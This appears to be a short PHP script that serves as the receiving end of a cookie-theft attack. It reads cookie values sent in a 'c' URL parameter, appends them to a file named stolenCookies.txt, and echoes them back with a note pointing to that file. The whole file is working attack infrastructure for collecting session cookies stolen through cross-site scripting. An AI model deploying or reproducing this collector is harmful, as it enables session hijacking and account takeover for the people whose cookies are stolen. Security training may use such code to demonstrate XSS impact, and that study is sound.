<?php
/**
 * Created by PhpStorm.
 * User: Peter
 * Date: 01-05-2018
 * Time: 15:32
 */

$cookies = $_GET["c"];
$file = fopen(' stolenCookies.txt', 'a');
fwrite($file, $cookies . "\n\n");

echo $cookies. "<br>";
echo "see ". "<B>stolenCookies.txt</B> " . "file, for cookie information";


